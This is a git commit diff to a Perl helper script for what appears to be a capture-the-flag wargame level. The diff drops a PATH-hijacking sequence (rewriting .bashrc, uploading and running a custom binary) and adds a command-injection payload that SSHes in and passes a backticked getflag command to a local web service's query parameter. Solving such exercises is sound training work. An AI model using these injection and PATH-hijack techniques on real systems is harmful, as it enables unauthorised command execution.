45c47ca96ddd0dcf20c33cf71b19648c7dd005f8
LXV <lxvsws@gmail.com>
2024-02-07 21:12:54 +0100

    save

--- level04/resources/script.pl
+++ level04/resources/script.pl
@@ -7,22 +7,9 @@ $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
 
-$scp = "scp -q -P 4242 $user\@$ip:~/level04.pl .";
-print $red, $scp, $reset, "\n";
-system($scp);
-
-$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
-$input = "chmod 777 . && chmod 777 .bashrc && echo $path > .bashrc";
-print $green, $input, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip '$input'");
-
-$scp2 = "scp -q -P 4242 ./echo.s $user\@$ip:~";
-print $red, $scp2, $reset, "\n";
-system($scp2);
-
-$tool = "as echo.s && ld a.out -o echo && ./echo";
-print $green, $tool, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip '$tool'");
+$inject = "ssh -qp 4242 $user\@$ip 'curl localhost:4747/?x=\\`getflag\\`'";
+print $green, $inject, $reset, "\n";
+system($inject);
 
 #file $file # basic informations
 #ldd $file # dynamic libraries
